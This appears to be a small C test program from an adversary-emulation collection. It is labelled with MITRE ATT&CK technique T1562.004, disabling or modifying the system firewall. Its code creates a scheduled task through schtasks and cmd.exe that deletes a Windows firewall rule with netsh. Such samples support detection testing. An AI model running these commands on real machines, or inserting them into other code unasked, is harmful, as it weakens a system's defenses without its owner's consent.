// Link      = https://attack.mitre.org/techniques/T1562/004/
// Technique = Impair Defenses: Disable or Modify System Firewall
// ID        = T1562.004
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("netsh advfirewall firewall delete rule name=\"My Rule\"");
    return 0;
}